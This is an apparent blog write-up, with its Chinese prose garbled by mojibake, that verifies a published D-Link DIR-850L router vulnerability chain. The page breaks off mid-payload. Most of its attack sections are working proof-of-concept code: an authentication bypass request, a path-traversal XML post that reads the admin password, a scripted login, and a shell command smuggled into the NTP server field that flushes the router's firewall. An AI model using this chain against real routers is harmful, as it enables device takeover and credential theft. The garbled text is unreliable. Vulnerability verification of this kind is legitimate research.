<!DOCTYPE html>
<html lang="zh"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="å‰è¨€
ç¿»äº†ä¸€ä¸‹ç¬”è®°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰èƒ½è´´å‡ºæ¥çš„ï¼Œå‘ç°è¿™ä¸ªå·²ç»è¿‡æ—¶äº†ã€‚è¿™ä¸ªç¬”è®°æ˜¯å½“æ—¶èŠ±äº†ä¸€æ™šä¸Šåšäº†ä¸€åŠï¼Œçªç„¶è®©æˆ‘å‡ºå·®ï¼Œå¦ä¸€ä¸ªå®ä¹ ç”Ÿæä¸å®šäºæ˜¯ä¸äº†äº†ä¹‹äº†ã€‚ç°åœ¨ä¹Ÿæ²¡æœ‰ç ”ç©¶ä»·å€¼äº†ï¼Œå¹²è„†è´´å‡ºæ¥å§ã€‚"><title>D-Link DIR 850L è·¯ç”±å™¨æ¼æ´éªŒè¯æŠ¥å‘Š&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="D-Link DIR 850L è·¯ç”±å™¨æ¼æ´éªŒè¯æŠ¥å‘Š" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/zh/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/zh/categories/">åˆ†ç±»</a><a class="nav item" href="/zh/tags/">æ ‡ç­¾</a><a class="nav item" href="/zh/about/">å…³äº</a><a class="nav item" href="/zh/links/">å‹é“¾</a><a class="nav item" href="/en/posts/d-link-dir-850l-router-vulnerability-report/" title="English">
            <span class="lang-icon">ğŸŒ</span>English</a></nav></div></span></div></section><section id="content"><style>
     
    .toc-wrapper {
        position: fixed;
        bottom: 30px;
        right: 30px;
        z-index: 9999;
        display: flex;
        flex-direction: column-reverse;
        align-items: flex-end;
        gap: 10px;
    }

     
    .toc-button {
        background-color: #fff;
        color: #333;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        border: 1px solid #ddd;
        transition: transform 0.2s, box-shadow 0.2s;
    }

    .toc-button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
    }

    .toc-button svg {
        width: 24px;
        height: 24px;
        fill: currentColor;
    }

     
    .toc-content-box {
        background: #fff;
        border: 1px solid #eee;
        border-radius: 8px;
        padding: 15px;
        width: 250px;
        max-height: 60vh;
        overflow-y: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        display: none;
         
        font-size: 0.9em;
        opacity: 0;
        transform: translateY(10px);
        transition: opacity 0.3s, transform 0.3s;
    }

    .toc-content-box.show {
        display: block;
        opacity: 1;
        transform: translateY(0);
    }

    .toc-header {
        font-weight: bold;
        border-bottom: 2px solid #f0f0f0;
        padding-bottom: 8px;
        margin-bottom: 8px;
        font-size: 1.1em;
    }

     
    #TableOfContents {
        text-align: left;
    }

    #TableOfContents ul,
    #TableOfContents ol {
        list-style: none;
        padding-left: 0;
        margin: 0;
    }

    #TableOfContents li {
        margin: 4px 0;
    }

    #TableOfContents ul ul,
    #TableOfContents ol ol {
        padding-left: 1em;
    }

    #TableOfContents a {
        text-decoration: none;
        color: #555;
        display: block;
        padding: 2px 0;
        transition: color 0.2s;
    }

    #TableOfContents a:hover {
        color: #007bff;
    }

     
    @media (prefers-color-scheme: dark) {
        .toc-button {
            background-color: #333;
            color: #ddd;
            border-color: #555;
        }

        .toc-content-box {
            background-color: #2a2a2a;
            border-color: #444;
            color: #ddd;
        }

        .toc-header {
            border-bottom-color: #444;
        }

        #TableOfContents a {
            color: #aaa;
        }

        #TableOfContents a:hover {
            color: #fff;
        }
    }
</style><div class="article-container"><section class="article header">
    <h1 class="article title">D-Link DIR 850L è·¯ç”±å™¨æ¼æ´éªŒè¯æŠ¥å‘Š</h1><p class="article date">2017-06-22<span class="langs"><span class="lang">
                    <a href="/en/posts/d-link-dir-850l-router-vulnerability-report/" title="English">
                        <span class="lang-icon">ğŸŒ</span>English</a>
                </span></span></p></section><article class="article markdown-body"><h2 id="å‰è¨€">å‰è¨€</h2>
<p>ç¿»äº†ä¸€ä¸‹ç¬”è®°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰èƒ½è´´å‡ºæ¥çš„ï¼Œå‘ç°è¿™ä¸ªå·²ç»è¿‡æ—¶äº†ã€‚è¿™ä¸ªç¬”è®°æ˜¯å½“æ—¶èŠ±äº†ä¸€æ™šä¸Šåšäº†ä¸€åŠï¼Œçªç„¶è®©æˆ‘å‡ºå·®ï¼Œå¦ä¸€ä¸ªå®ä¹ ç”Ÿæä¸å®šäºæ˜¯ä¸äº†äº†ä¹‹äº†ã€‚ç°åœ¨ä¹Ÿæ²¡æœ‰ç ”ç©¶ä»·å€¼äº†ï¼Œå¹²è„†è´´å‡ºæ¥å§ã€‚</p>
<blockquote>
<p>CNVDåœ¨2017å¹´8æœˆ10æ—¥å‘å¸ƒäº†D-Link DIRç³»åˆ—ç”±å™¨èº«ä»½éªŒè¯ä¿¡æ¯æ³„éœ²æ¼æ´å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCNVD-2017-20002ã€CNVD-2017-20001ï¼‰,æ ¹æ®çŸ¥é“åˆ›å®‡çš„éªŒè¯æƒ…å†µï¼Œå—æ¼æ´å½±å“çš„D-Link è·¯ç”±å™¨å‹å·ä¸é™äºå®˜æ–¹å‚å•†ç¡®è®¤çš„DIR-850Lå‹å·ï¼Œç›¸å…³å—å½±å“çš„å‹å·è¿˜åŒ…æ‹¬DIR-868Lã€DIR-600ã€DIR-860Lã€DIR-815ã€DIR-890Lã€DIR-610Lã€DIR-822ã€‚ç›¸å…³åˆ©ç”¨ä»£ç å·²åœ¨äº’è”ç½‘å…¬å¼€ï¼Œå—åˆ°å½±å“çš„è®¾å¤‡æ•°é‡æ ¹æ®æ ‡å®šè¶…è¿‡20ä¸‡å°ï¼Œæœ‰å¯èƒ½ä¼šè¯±å‘å¤§è§„æ¨¡çš„ç½‘ç»œæ”»å‡»ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬é‡‡è´­äº†ä¸€ä¸ªå®˜æ–¹æœªç¡®è®¤ä½†å­˜åœ¨CNVDå½±å“åˆ—è¡¨ä¸­çš„å‹å·DIR-850L/B1ï¼Œç›®çš„æ˜¯éªŒè¯æ¼æ´å…¬å‘Šçš„ç¼ºé™·çœŸå®æ€§ã€‚<br>
å¹¶ä¸”ä¸‹è½½äº†å½±å“åˆ—è¡¨ä¸­å…¶ä»–å‹å·çš„æœ€æ–°å›ºä»¶ç”¨äºåˆ†æï¼Œç›®çš„æ˜¯éªŒè¯æ•°æ®å¯é æ€§ã€‚</p>
<h2 id="éªŒè¯å‡†å¤‡">éªŒè¯å‡†å¤‡</h2>
<p>å…ˆæ¨¡æ‹ŸçœŸå®ä½¿ç”¨ç¯å¢ƒï¼Œé…ç½®ä¸Šç½‘å‚æ•°ï¼Œè®¾ç½®æ— çº¿å¯†ç ä»¥åŠç®¡ç†å¯†ç ï¼Œæ³¨å†ŒMyDlinkè´¦æˆ·ã€‚<br>
<img loading="lazy"  src="./configured.png"
        alt="configured"/></p>
<p>è®¡åˆ’å…ˆéªŒè¯å½“å‰ç‰ˆæœ¬2.06çš„æ¼æ´ï¼Œç„¶ååˆ·å…¥æœ€æ–°å›ºä»¶å¹¶éªŒè¯æ¼æ´ã€‚<a href="http://support.dlink.com/ProductInfo.aspx?m=DIR-850L"target="_blank" rel="noopener noreferrer">DIR-850L/B1</a>å®˜æ–¹æœ€æ–°å›ºä»¶ç‰ˆæœ¬æ˜¯2.07B05ï¼Œå‘å¸ƒæ—¶é—´æ˜¯02/21/17ï¼Œå¯çŸ¥å®˜æ–¹æ²¡æœ‰ä¸ºå…¶æ‰“ä¸Šè¡¥ä¸ã€‚<br>
ç„¶åé€šè¿‡WANæµ‹è¯•æ˜¯å¦èƒ½ç›´æ¥è®¿é—®ç›®æ ‡è®¾å¤‡ï¼Œç»“æœæ˜¾ç¤ºå½“å‰è®¾å¤‡æ— æ³•ç›´æ¥é€šè¿‡WANè®¿é—®ã€‚<br>
<img loading="lazy"  src="./port-scan.png"
        alt="port-scan"/><br>
é™¤éæ‰‹åŠ¨å¼€å¯è¿œç¨‹ç®¡ç†æ‰èƒ½é€šè¿‡WANå£çš„é80ç«¯å£è®¿é—®è·¯ç”±å™¨
<img loading="lazy"  src="./remote.png"
        alt="remote"/></p>
<h2 id="åˆ†æ">åˆ†æ</h2>
<p>ä½œè€…è¯´æ˜è¿œç¨‹å‘½ä»¤æ‰§è¡Œç”±ä¸¤ä¸ªæ¼æ´ç»„æˆï¼Œé€šè¿‡è¿™ä¸ªæ”»å‡»ç»„åˆå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<ul>
<li>æœªè®¤è¯ç”¨æˆ·å¯ä¸Šä¼ ä»»æ„æ–‡ä»¶</li>
<li>ç®¡ç†å‘˜ç”¨æˆ·å¯æ‰§è¡Œä»»æ„ä»£ç </li>
</ul>
<p>ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ä¸Šä¼ ä»»æ„æ–‡ä»¶çš„è¯æ˜</p>
<h3 id="å¯¹æ¯”è¡¥ä¸">å¯¹æ¯”è¡¥ä¸</h3>
<p><img loading="lazy"  src="./bcompare.png"
        alt="bcompare"/><br>
ä¸»è¦å˜åŒ–çš„å¯æ‰§è¡Œæ–‡ä»¶æ˜¯cgibinï¼Œè„šæœ¬æ–‡ä»¶æ˜¯DEVICE.TIME.phpå’Œfatlady.phpã€‚<br>
DEVICE.TIME.phpåŠ å…¥äº†NTPæœåŠ¡å™¨åŸŸåçš„éªŒè¯ï¼Œé˜²æ­¢å‘½ä»¤æ³¨å…¥ã€‚<br>
<img loading="lazy"  src="./device-time-patch.png"
        alt="device-time-patch"/><br>
fatlady.phpåŠ å…¥äº†ç›¸å¯¹è·¯å¾„æ„é€ å­—ç¬¦çš„è¿‡æ»¤ã€‚<br>
<img loading="lazy"  src="./fatlady-patch.png"
        alt="fatlady-patch"/></p>
<p>å…ˆåˆ†æDIR 850L/Açš„PoCå’Œå›ºä»¶ã€‚ä½œè€…çš„PoCè¯æ˜äº†4å¤„ç¼ºé™·ï¼Œå¹¶ç»„åˆåˆ©ç”¨å®ƒä»¬è¾¾åˆ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚</p>
<h3 id="æœªæˆæƒè®¿é—®">æœªæˆæƒè®¿é—®</h3>
<p>æœªç™»å½•çš„ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®CGIã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="s2">&#34;whatever&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>ä½¿ç”¨AUTHORIZED_GROUP&gt;=1çš„headerä¹Ÿèƒ½ç»•è¿‡éªŒè¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -d <span class="s2">&#34;SERVICES=DEVICE.ACCOUNT&amp;x=y&amp;AUTHORIZED_GROUP=1&#34;</span> <span class="s2">&#34;http://192.168.1.159:8080/getcfg.php&#34;</span>
</span></span></code></pre></div><h3 id="ç®¡ç†å‘˜å¯†ç è¯»å–">ç®¡ç†å‘˜å¯†ç è¯»å–</h3>
<p>æ„é€ xmlï¼Œå‘é€ç»™/hedwig.cgiï¼Œç„¶åè¯»å–é‡Œé¢çš„è´¦å·å’Œå¯†ç ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="s2">&#34;whatever&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;postxml&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;module&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/module&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/postxml&gt;&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/hedwig.cgi&#34;</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">accdata</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&lt;?xml&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_pasw</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">accdata</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">accounts</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;/module/device/account/entry&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">acc</span> <span class="ow">in</span> <span class="n">accounts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="n">pasw</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;name:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;pass:&#34;</span><span class="p">,</span> <span class="n">pasw</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">&#34;Admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">admin_pasw</span> <span class="o">=</span> <span class="n">pasw</span>
</span></span></code></pre></div><h3 id="ç™»å½•å£ä»¤çˆ†ç ´">ç™»å½•å£ä»¤çˆ†ç ´</h3>
<p>payloadä¸­åŠ å¯†çš„passwordå¯ä»¥è‡ªå·±æ„é€ ï¼Œå¯æš´åŠ›ç ´è§£ã€‚åœ¨PoCé‡Œç”¨äºç™»å½•è´¦æˆ·è·å¾—Cookieã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/authentication.cgi&#34;</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl"><span class="c1"># print(resp.text)  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;status&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&#34;ok&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;uid:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;challenge:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;challenge&#34;</span><span class="p">])</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;uid&#34;</span><span class="p">]})</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Auth login...&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">user_name</span> <span class="o">=</span> <span class="s2">&#34;Admin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">user_pasw</span> <span class="o">=</span> <span class="n">admin_pasw</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">user_name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">user_pasw</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="p">(</span><span class="n">user_name</span> <span class="o">+</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&#34;challenge&#34;</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="s2">&#34;md5&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/authentication.cgi&#34;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
</span></span></code></pre></div><h3 id="ä¸¤å¤„å‘½ä»¤æ³¨å…¥">ä¸¤å¤„å‘½ä»¤æ³¨å…¥</h3>
<p>pigwidgeon.cgiå’Œhedwig.cgiéƒ½å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œpayloadé€šè¿‡æ„é€ xmlç„¶åè¢«POSTè¿‡å»ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;SERVICES&#34;</span><span class="p">:</span> <span class="s2">&#34;DEVICE.TIME&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&#34;/getcfg.php&#34;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp/enable&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp/server&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;metelesku; (&#34;</span> <span class="o">+</span> <span class="n">COMMAND</span> <span class="o">+</span> <span class="s2">&#34;) &amp; exit; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//ntp6/enable&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">tostring</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>  
</span></span></code></pre></div><p>åˆ†æå®ŒPoCåï¼Œè§£åŒ…D-Linkå›ºä»¶ï¼Œç„¶ååˆ†ææ–‡ä»¶ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">binwalk DIR850LA1_FW114b07WW.bin
</span></span><span class="line"><span class="cl">dd <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="m">1638544</span> <span class="k">if</span><span class="o">=</span>DIR850LA1_FW114b07WW.bin <span class="nv">of</span><span class="o">=</span>DIR850LA1_FW114b07WW.squashfs
</span></span><span class="line"><span class="cl">unsquashfs DIR850LA1_FW114b07WW.squashfs
</span></span></code></pre></div><p>å‘ç°è¯¥ç›®å½•ä¸‹çš„CGIæ–‡ä»¶éƒ½æ˜¯æŒ‡å‘cgibinçš„ç¬¦å·é“¾æ¥<br>
<img loading="lazy"  src="./files.png"
        alt="files"/><br>
webæ¶æ„åç«¯ç”±PHPæä¾›HNAPçš„WebServiceï¼Œå‰ç«¯å¼‚æ­¥è¯·æ±‚ã€‚<br>
åˆ†æç”¨äºè§£æPHPå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶/htdocs/cgibinï¼Œä»å…¥å£ç‚¹è·Ÿè¿›ã€‚<br>
<img loading="lazy"  src="./main.png"
        alt="main"/><br>
é€šè¿‡argv[0]åŒ¹é…ç›¸åº”çš„CGIï¼ŒCGIå†å»æ‰§è¡ŒPHPæ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…åˆ°åˆ™è¾“å‡º</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">CGI.BIN, unknown command argv[0]
</span></span></code></pre></div><p><img loading="lazy"  src="./main1.png"
        alt="main1"/><br>
hedwigcgi_mainæŠŠè·å–åˆ°çš„xmlæ–‡æœ¬è§£ææˆå‚æ•°ï¼Œç„¶åä¼ é€’ç»™/htdocs/webinc/fatlady.phpã€‚<br>
<img loading="lazy"  src="./tofatlady.png"
        alt="tofatlady"/></p>
<p>å…³é”®åœ¨è¿™ä¸‰è¡Œï¼Œè·å–åˆ°serviceå‚æ•°ï¼Œè®©PHPåŠ è½½æ–‡ä»¶ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$service</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;service&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s2">&#34;/htdocs/phplib/fatlady/&#34;</span><span class="o">.</span><span class="nv">$service</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isfile</span><span class="p">(</span><span class="nv">$target</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">dophp</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="nv">$target</span><span class="p">);</span>
</span></span></code></pre></div><p>é€šè¿‡æ„é€ ç›®å½•ï¼Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶åŒ…å«ï¼Œè¾¾åˆ°è¾“å‡ºæ•æ„Ÿä¿¡æ¯çš„ç›®çš„ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/htdocs/phplib/fatlady/../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php
</span></span></code></pre></div><p><img loading="lazy"  src="./getcfg.png"
        alt="getcfg"/></p>
<p>pigwidgeoncgi_mainå…ˆéªŒè¯sessionæ˜¯å¦å±äºç®¡ç†å‘˜ï¼Œå¦‚æœå±äºåˆ™æŠŠxmlè§£æï¼Œå¹¶è®¾ACTIONå‚æ•°å€¼ä¸ºSETCFGï¼Œç„¶åä¼ å…¥/htdocs/webinc/wand.php<br>
<img loading="lazy"  src="./session.png"
        alt="session"/><br>
<img loading="lazy"  src="./wand1.png"
        alt="wand1"/><br>
<img loading="lazy"  src="./wand2.png"
        alt="wand2"/></p>
<p>å…³é”®ä»£ç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$svc</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">&#34;service&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;/htdocs/phplib/setcfg/&#34;</span><span class="o">.</span><span class="nv">$svc</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">dophp</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span></code></pre></div><p>ç„¶åå¯ä»¥åŒ…å«æŒ‡å®šæ–‡ä»¶DEVICE.TIME</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">service</span> <span class="o">=</span> <span class="n">DEVICE</span><span class="o">.</span><span class="n">TIME</span>
</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="n">metelesku</span><span class="p">;</span> <span class="p">(</span><span class="n">iptables</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">F</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">X</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span 